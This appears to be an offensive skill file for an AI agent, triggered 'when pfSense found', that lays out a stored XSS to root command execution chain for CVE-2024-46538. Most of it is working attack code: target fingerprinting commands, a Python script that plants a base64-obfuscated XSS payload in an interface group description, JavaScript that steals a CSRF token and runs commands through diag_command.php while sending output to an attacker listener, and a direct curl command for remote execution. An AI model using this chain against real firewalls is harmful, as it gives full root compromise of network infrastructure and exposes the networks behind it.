---
name: pfsense-xss-to-rce
description: "Use when pfSense found. Stored XSS to RCE chain."
---
# CVE-2024-46538 pfSense Stored XSS → RCE

## Overview
pfSense <= 2.7.2. Stored XSS in `interfaces_groups_edit.php` via the group description field. When an admin views the interface groups page, the XSS payload executes and can chain to `diag_command.php` for arbitrary OS command execution as root.

## Detection
```bash
# Fingerprint pfSense
curl -sI <TARGET> | grep -i 'server:\|pfsense'
curl -s <TARGET>/index.php | grep -o 'pfSense.*<'
# Login page at /index.php with pfSense branding
```

## Exploitation

### Step 1: Inject XSS payload (requires low-priv auth)
```python
import requests

TARGET = '<TARGET>'
s = requests.Session()
s.verify = False

# Login (need at least interface-group edit permission)
s.post(f'{TARGET}/index.php', data={
    '__csrf_magic': '<CSRF_TOKEN>',
    'usernamefld': '<USERNAME>',
    'passwordfld': '<PASSWORD>',
    'login': 'Sign In'
})

# XSS payload that chains to RCE via diag_command.php
js_payload = '''
fetch('/diag_command.php').then(r=>r.text()).then(h=>{
  let csrf=h.match(/__csrf_magic.*?value="([^"]+)"/)[1];
  fetch('/diag_command.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'__csrf_magic='+csrf+'&txtCommand=id|curl+<LHOST>:<LPORT>/$(id|base64)&submit=EXEC'})
})'''.replace('\n','').strip()

import base64
b64 = base64.b64encode(js_payload.encode()).decode()
xss = f'<img src=x onerror="eval(atob(\'{b64}\'))">'

# Create/edit interface group with XSS in description
s.post(f'{TARGET}/interfaces_groups_edit.php', data={
    '__csrf_magic': '<CSRF>',
    'ifname': 'pwn',
    'descr': xss,
    'members[]': 'em0',
    'save': 'Save'
})
```

### Step 2: Wait for admin to view interface groups page
When admin visits `/interfaces_groups.php`, XSS fires → `diag_command.php` executes OS commands as root.

### Direct RCE (if admin creds available)
```bash
# Skip XSS, go straight to command exec
curl -s -b cookies.txt '<TARGET>/diag_command.php' \
  -d '__csrf_magic=<CSRF>&txtCommand=id&submit=EXEC'
```

## Pitfalls
- pfSense runs as root — any command exec = full system compromise
- CSRF tokens required on every POST
- XSS payload length limited by database column — keep it short (use base64+eval)
- `diag_command.php` only accessible to admin role
- Source: EQSTLab/CVE-2024-46538